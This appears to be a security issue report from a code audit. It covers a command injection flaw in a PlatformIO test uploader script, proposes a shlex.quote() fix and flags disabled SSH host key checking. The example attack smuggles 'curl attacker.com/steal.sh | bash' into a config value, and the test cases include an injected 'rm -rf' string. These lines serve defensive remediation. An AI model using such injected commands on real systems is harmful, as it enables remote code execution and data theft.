# 🔴 CRITICAL: Fix Command Injection in Test Uploader

## Priority
**P0 - CRITICAL SECURITY** 🚨

**MUST FIX before next release (v1.7.1 or v1.8.0)**

## Labels
`security`, `critical`, `P0`, `bug`, `testing`

## Summary

Critical command injection vulnerability in `platform-test-uploader.py` allows arbitrary code execution on test targets through unsanitized test path input.

## Security Impact

**CVSS Score:** 8.5 (High)

**Attack Vector:** Malicious test paths in `test_port` configuration can execute arbitrary commands on remote test targets during test execution.

**Example Attack:**
```ini
# In platformio.ini
test_port = pi@test-host:/tmp/test; curl attacker.com/steal.sh | bash
```

## Affected Code

### Vulnerability: Test Execution Path (Line 195)
```python
# VULNERABLE CODE
test_command = f"{self.remote_path}; echo \"__EXIT_CODE__:$?\""
```

**Risk:** `self.remote_path` is user-controlled via `test_port` configuration and not shell-escaped before being passed to SSH.

**Impact:**
- Arbitrary command execution on test target
- Potential data exfiltration during CI/CD
- Compromise of test infrastructure

## Solution

Use `shlex.quote()` to properly escape the test path before shell execution.

### Implementation

```python
import shlex

# Fix: Line 195 (execute_test_binary)
test_command = f"{shlex.quote(self.remote_path)}; echo \"__EXIT_CODE__:$?\""
```

## Testing Requirements

**Test Cases:**
- [ ] Normal test paths work: `/tmp/test_program`
- [ ] Paths with spaces work: `/tmp/my test program`
- [ ] Malicious input is escaped: `/tmp/test; echo "EXPLOITED"`
- [ ] Special characters handled: `$HOME/test`, `~/test`
- [ ] Test exit codes correctly captured
- [ ] Test output correctly streamed
- [ ] Failed tests report proper exit codes

**Manual Testing:**
```bash
# Test with malicious path
echo 'test_port = pi@host:/tmp/test; echo "EXPLOITED"' >> platformio.ini
pio test
# Should NOT see "EXPLOITED" in output (except as literal string in path error)
```

**Automated Testing:**
```python
# Unit test for shlex escaping
def test_remote_path_escaping():
    malicious_path = "/tmp/test; rm -rf /tmp/data"
    escaped = shlex.quote(malicious_path)
    # Should be: '/tmp/test; rm -rf /tmp/data' (single-quoted)
    assert escaped == "'/tmp/test; rm -rf /tmp/data'"
```

## Acceptance Criteria

- [ ] Command injection vulnerability fixed with `shlex.quote()`
- [ ] All test cases pass
- [ ] Malicious input properly escaped
- [ ] Normal test execution works correctly
- [ ] Test exit codes correctly captured
- [ ] CI/CD pipeline tests pass
- [ ] Documentation updated with security notes
- [ ] Code reviewed

## Additional Security Concern

**Note:** This file also has intentionally disabled SSH host key checking (lines 126-128):

```python
cmd.extend(["-o", "StrictHostKeyChecking=no"])
cmd.extend(["-o", "UserKnownHostsFile=/dev/null"])
```

While documented as intentional for automated testing, this presents a **MITM risk**. Consider:

1. Adding configuration option to enable strict checking
2. Documenting security implications in README
3. Recommending strict checking for production/sensitive environments

**This can be addressed in Phase 1, Task 1.4 (Security Documentation).**

## Related Issues

- Depends on: #[Phase 1 Issue 1] - Command injection in platform.py (same vulnerability class)
- Part of: Python Codebase Security Audit
- Related to: #[Phase 1 Issue 4] - Security documentation

## References

**Analysis Report:** `research/PYTHON_CODEBASE_ANALYSIS.md` (Phase 1, Task 1.2)

**Affected Files:**
- `platform-test-uploader.py:195` (execute_test_binary method)
- `platform-test-uploader.py:126-128` (SSH host key checking - documentation issue)

**External References:**
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Python shlex.quote() documentation](https://docs.python.org/3/library/shlex.html#shlex.quote)
- [SSH Host Key Verification](https://www.openssh.com/txt/release-7.4)

## Estimated Effort

**1-2 hours** (simple fix + testing)

## Implementation Notes

1. Add `import shlex` at top of file (if not already present)
2. Apply fix to line 195
3. Run full test suite
4. Test on actual hardware with SSH transport
5. Verify test exit codes are still correctly captured
6. Update security documentation (coordinate with Issue #4)

---

**Created from:** Python Codebase Analysis Report (2025-11-14)
**Analysis:** research/PYTHON_CODEBASE_ANALYSIS.md
